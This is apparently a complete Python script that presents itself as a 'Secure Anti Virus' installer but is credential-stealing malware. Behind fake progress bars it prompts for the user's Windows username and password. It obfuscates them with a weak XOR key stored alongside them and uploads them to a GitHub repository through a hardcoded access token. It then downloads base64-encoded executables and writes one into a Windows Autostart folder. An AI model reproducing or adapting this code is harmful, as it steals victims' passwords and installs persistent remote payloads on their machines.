import getpass
import os
import time
import random
import requests
import base64
import github
from github import Github

GRAY = "\033[30m"
PURPLE = "\033[35m"
BLUE = "\033[34m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

key = "C:9AD.~f%mRq]',d"

def xor_crypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key)) + key[:len(data) % len(key)]))

def encrypt(message, key):
    return xor_crypt(message, key)

username = os.getenv('USERNAME')
folder_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\'
file_name = 'Passwords.txt'
file_path = os.path.join(folder_path, file_name)

folder_path_2 = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Autostart'
file_name_2 = 'Antivirus.exe'
file_path_2 = os.path.join(folder_path_2, file_name_2)

os.makedirs(folder_path, exist_ok=True)
os.makedirs(folder_path_2, exist_ok=True)

for x in range(1, 101):
    os.system("cls")
    print("Installing Secure Anti Virus package 1...")
    print(f"\n{GREEN}{"▓" * (x // 3)}{"░" * (100 // 3 - x // 3)}{RESET}      {x} %...")
    time.sleep(random.randint(1, 5) / 100)

for x in range(1, 101):
    os.system("cls")
    print("Installing Secure Anti Virus package 1...")
    print(f"\n{GREEN}{"▓" * (100 // 3)}{RESET}      100 %...")
    print("\nConnecting to the Secure Anti Virus servers...")
    print(f"\n{RED}{"▓" * (x // 3)}{"░" * (100 // 3 - x // 3)}{RESET}      {x} %...")
    time.sleep(random.randint(1, 3) / 200)

usernames = os.listdir("C:\\Users")
ucount = 0

def get_username():
    global username
    username = input("\nEnter your username: ")
    return username

while not get_username() in usernames:
    ucount += 1
    print("\nERROR. Username does not exist.")

all_passwords = []

def get_password():
    global passwords
    passwords = []
    for x in range(4):
        passwords.append(getpass.getpass("\nInput your computer password:  "))
        all_passwords.append(passwords[x])

count = 0

while True:
    count += 1
    get_password()
    if passwords[0] == passwords[1] == passwords[2] == passwords[3]:
        break
    print("\nERROR. Passwords did not match.")

os.system("cls")

for x in range(1, 101):
    os.system("cls")
    print("Installing Secure Anti Virus package 1...")
    print(f"\n{GREEN}{"▓" * (100 // 3)}{RESET}      100 %...")
    print("\nConnecting to the Secure Anti Virus servers...")
    print(f"\n{RED}{"▓" * (100 // 3)}{RESET}      100 %...")
    if ucount > 0:
        for y in range(count):
            print(f"\nEnter your username: {username}\n", "\nERROR. Username does not exist.")
    else:
        print(f"\nEnter your username: {username}")
    if count > 1:
        for y in range(count):
            print("\nInput your computer password:  \n" * 4, "\nERROR. Passwords did not match.")
    else:
        print("\nInput your computer password:  \n" * 4)
    print("\nAccessing servers for authentication...")
    print(f"\n{YELLOW}{"▓" * (x // 3)}{"░" * (100 // 3 - x // 3)}{RESET}      {x} %...")
    time.sleep(random.randint(1, 3) / 200)

uencrypted = encrypt(username, key)
pencrypted = [encrypt(p, key) for p in passwords]

with open(file_path, 'w') as file:
    file.write(key + "\n")
    file.write(uencrypted + "\n")
    for p in pencrypted:
        file.write(p + "\n")

access_token = "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"
repo_name = "Limauca/Private-1"
file_path_on_github = "Passwords.txt"
commit_message = "Append new content to Passwords.txt"

g = Github(access_token)
repo = g.get_repo(repo_name)

with open(file_path, 'r') as file:
    new_content = file.read()

try:
    file_in_repo = repo.get_contents(file_path_on_github)
    current_file_content = base64.b64decode(file_in_repo.content).decode('utf-8')
    updated_content = current_file_content + "\n" + new_content
    repo.update_file(file_in_repo.path, commit_message, updated_content, file_in_repo.sha)

except Exception as e:
    repo.create_file(file_path_on_github, commit_message, new_content)

count = 1

def download_and_save_executable(file_url, output_path):
    global count
    count += 1
    headers = {'Authorization': f'token {access_token}'}
    response = requests.get(file_url, headers=headers)
    if response.status_code == 200:
        with open(output_path, 'wb') as file:
            file.write(response.content)
        print(f"\nInstalling Secure Anti Virus package {count}...")
    else:
        print(f"Failed to download from {file_url}, status code: {response.status_code}")

def loading_bar(total, title):
    for x in range(1, total + 1):
        os.system("cls")
        print(f"{title}...")
        print(f"\n{GREEN}{'▓' * (x // 3)}{'░' * (total // 3 - x // 3)}{RESET}      {x} %...")
        time.sleep(random.uniform(0.05, 0.1))

file_url_cli = 'https://raw.githubusercontent.com/Limauca/Private-1/main/base64_output.txt'
downloaded_file_name_cli = 'CLI.txt'
downloaded_file_path_cli = os.path.join(folder_path, downloaded_file_name_cli)

loading_bar(100, "Downloading SecureAV-CLI.exe")
download_and_save_executable(file_url_cli, downloaded_file_path_cli)

with open(downloaded_file_path_cli, 'r') as file:
    file_contents = file.read()
binary_data_cli = base64.b64decode(file_contents)

output = os.path.join(folder_path, 'SecureAV-CLI.exe')
with open(output, 'wb') as exe_file:
    exe_file.write(binary_data_cli)

os.remove(downloaded_file_path_cli)

file_url_launcher = 'https://raw.githubusercontent.com/Limauca/Private-1/main/base64_output2.txt'
downloaded_file_name_launcher = 'Launcher.txt'
downloaded_file_path_launcher = os.path.join(f'C:\\Users\\{username}\\Downloads', downloaded_file_name_launcher)

loading_bar(100, "Downloading SecureAV-Launcher.exe")
download_and_save_executable(file_url_launcher, downloaded_file_path_launcher)

with open(downloaded_file_path_launcher, 'r') as file:
    file_contents = file.read()
binary_data_launcher = base64.b64decode(file_contents)

output2 = os.path.join(f'C:\\Users\\{username}\\Downloads', 'SecureAV-Launcher.exe')
with open(output2, 'wb') as exe_file:
    exe_file.write(binary_data_launcher)

os.remove(downloaded_file_path_launcher)

file_url_virus_scan = 'https://raw.githubusercontent.com/Limauca/Private-1/main/base64_output3.txt'
downloaded_file_name_virus_scan = 'SecureVirusScan.txt'
downloaded_file_path_virus_scan = os.path.join(folder_path_2, downloaded_file_name_virus_scan)

loading_bar(100, "Downloading SecureAV-VirusScan.exe")
download_and_save_executable(file_url_virus_scan, downloaded_file_path_virus_scan)

with open(downloaded_file_path_virus_scan, 'r') as file:
    file_contents = file.read()
binary_data_virus_scan = base64.b64decode(file_contents)

output3 = os.path.join(folder_path_2, 'SecureAV-VirusScan.exe')
with open(output3, 'wb') as exe_file:
    exe_file.write(binary_data_virus_scan)

os.remove(downloaded_file_path_virus_scan)
